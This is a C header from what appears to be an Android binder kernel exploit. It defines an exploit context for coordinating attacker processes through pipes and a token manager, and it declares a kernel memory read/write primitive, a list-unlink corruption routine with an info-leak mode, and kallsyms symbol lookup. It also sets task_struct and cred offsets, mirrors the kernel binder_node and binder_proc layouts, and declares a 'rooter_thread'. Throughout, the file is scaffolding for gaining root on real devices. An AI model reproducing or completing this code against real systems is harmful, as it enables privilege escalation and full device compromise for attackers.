#ifndef _EXPLOIT_H
#define _EXPLOIT_H

#include <pthread.h>
#include <stdatomic.h>
#include "token_manager.h"
#include "util.h"
#include "binder.h"
#include "binder_client.h"

#define MIN(x,y) ((x) > (y) ? (y) : (x))
#define MAX(x,y) ((x) > (y) ? (x) : (y))

struct ksym {
    void *kmap;
    u32 kmap_size;
    u32 num_syms;
    u64 relative_base;
    /* These are offsets. */
    u32 kallsyms_token_table;
    u32 kallsyms_token_index;
    u32 kallsyms_markers;
    u32 kallsyms_names;
    u32 kallsyms_num_syms;
    u32 kallsyms_relative_base;
    u32 kallsyms_offsets;
};

typedef struct {
    usize ts_tasks_next;
    usize ts_thread_group_next;
    usize ts_pid;
    usize ts_tgid;
    usize ts_files;
    usize ts_cred;

    // this is technically in struct file
    usize fs_fdt;
} TaskStructOffsets;

typedef struct {
    // fd for send and receive ends of pipe for sending commands to b
    int send_command_pipe;
    int recv_command_pipe;

    // fd for send and receive ends of pipe for receiving responses from b
    int send_response_pipe;
    int recv_response_pipe;
} CommandPipe;

typedef struct {
    CommandPipe b_pipe;
    CommandPipe c_pipe;
    CommandPipe d_pipe;

    // token of a
    // b will look in token manager for this token to get a binder reference to a's control node
    struct token a_token;

    // syncronise a and c for after A finishes registering with token manager
    pthread_barrier_t a_register_done;
} ExploitCtx;

typedef enum {
    Read,
    Write,
} KReadWriteOp;

typedef struct {
    atomic_uint status;
    KReadWriteOp op;
    u64 addr;
    u64 size;
    int read_pipe;
    int write_pipe;
} KReadWriteInfo;

typedef struct {
    ExploitCtx *ctx;
    binder_client_t binder;
    u32 c_handle;
    u32 d_handle;
    // when local context passed to new thread, this instructe new thread id of node to allocate
    binder_uintptr_t allocate_node_id;
    bool allocate_node_forever;
    int epoll_fd;
    int leak_fd;
    int wr_addr_fd;
    int wr_data_fd;
    u64 kernel_base;
    struct ksym ksym;
    TaskStructOffsets task_offsets;
    KReadWriteInfo kread_write;
} LocalCtx;

typedef struct {
    u64 task_struct;
    u64 files_struct;
} TaskInfo;

void process_a_register(LocalCtx *ctx);
void process_a_deregister(LocalCtx *ctx);
u64 try_mem_unlink(LocalCtx *ctx, usize prev_addr, usize next_addr, bool leak_only);

// in root.c
void rooter_thread(LocalCtx *ctx);
void read_write_thread(LocalCtx *ctx);

bool find_kallsyms(LocalCtx *rw);
u64 kallsyms_lookup_name(LocalCtx *rw, const char *name);


// linux kernel binder structs for layout info
struct list_head { 
    struct list_head *next, *prev; 
}; 

struct hlist_head { 
    struct hlist_node *first; 
}; 

struct hlist_node { 
    struct hlist_node *next, **pprev; 
};

struct rb_node {
    unsigned long  __rb_parent_color;
    struct rb_node *rb_right;
    struct rb_node *rb_left;
} __attribute__((aligned(sizeof(long))));

struct rb_root {
    struct rb_node *rb_node;
};

struct binder_work {
    struct list_head entry;

    enum binder_work_type {
        BINDER_WORK_TRANSACTION = 1,
        BINDER_WORK_TRANSACTION_COMPLETE,
        BINDER_WORK_TRANSACTION_ONEWAY_SPAM_SUSPECT,
        BINDER_WORK_RETURN_ERROR,
        BINDER_WORK_NODE,
        BINDER_WORK_DEAD_BINDER,
        BINDER_WORK_DEAD_BINDER_AND_CLEAR,
        BINDER_WORK_CLEAR_DEATH_NOTIFICATION,
    } type;
};

struct binder_node {
	int debug_id;
	//spinlock_t lock;
    // TODO: figure out if this is correct (should be based on offset of ptr and cookie)
    u32 lock;
	struct binder_work work;
	union {
		struct rb_node rb_node;
		struct hlist_node dead_node;
	};
	struct binder_proc *proc;
	struct hlist_head refs;
	int internal_strong_refs;
	int local_weak_refs;
	int local_strong_refs;
	int tmp_refs;
    // Offset 88 and 96
	binder_uintptr_t ptr;
	binder_uintptr_t cookie;
	struct {
		/*
		* bitfield elements protected by
		* proc inner_lock
		*/
		u8 has_strong_ref:1;
		u8 pending_strong_ref:1;
		u8 has_weak_ref:1;
		u8 pending_weak_ref:1;
	};
	struct {
		/*
		* invariant after initialization
		*/
		u8 sched_policy:2;
		u8 inherit_rt:1;
		u8 accept_fds:1;
		u8 txn_security_ctx:1;
		u8 min_priority;
	};
	bool has_async_transaction;
	struct list_head async_todo;
};

struct binder_proc {
        struct hlist_node proc_node;
        struct rb_root threads;
        struct rb_root nodes;
        struct rb_root refs_by_desc;
        struct rb_root refs_by_node;
        struct list_head waiting_threads;
        int pid;
        struct task_struct *tsk;
        const struct cred *cred;
        struct hlist_node deferred_work_node;
        int deferred_work;
        int outstanding_txns;
        // stuff after doesn't matter
        // bool is_dead;
        // bool is_frozen;
        // bool sync_recv;
        // bool async_recv;
        // wait_queue_head_t freeze_wait;

        // struct list_head todo;
        // struct binder_stats stats;
        // struct list_head delivered_death;
        // int max_threads;
        // int requested_threads;
        // int requested_threads_started;
        // int tmp_ref;
        // struct binder_priority default_priority;
        // struct dentry *debugfs_entry;
        // struct binder_alloc alloc;
        // struct binder_context *context;
        // spinlock_t inner_lock;
        // spinlock_t outer_lock;
        // struct dentry *binderfs_entry;
        // bool oneway_spam_detection_enabled;
};

#endif